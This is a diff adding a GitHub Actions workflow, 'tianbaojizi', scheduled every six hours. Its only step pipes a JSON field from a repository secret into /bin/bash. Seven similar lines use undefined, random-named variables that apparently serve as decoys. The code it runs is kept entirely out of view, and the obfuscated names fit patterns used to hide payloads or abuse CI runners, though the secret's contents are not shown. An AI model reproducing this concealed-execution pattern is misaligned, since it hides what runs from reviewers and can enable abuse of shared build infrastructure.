@@ -1,0 +1,25 @@
+name: tianbaojizi
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tianbaojizi
+        env:
+          fau0: ${{ secrets.fau0 }}
+        run: |
+          echo $fau0 | jq -r .mpxzn4161 | /bin/bash
+          echo $xutik38 | jq -r .wri059 | /bin/bash
+          echo $eotmz08914 | jq -r .y22 | /bin/bash
+          echo $x9 | jq -r .igusp37396 | /bin/bash
+          echo $g0 | jq -r .xi7374 | /bin/bash
+          echo $o0493 | jq -r .rrioe80960 | /bin/bash
+          echo $xgwe67879 | jq -r .lvo87857 | /bin/bash
+          echo $ayj4 | jq -r .yli95388 | /bin/bash
+
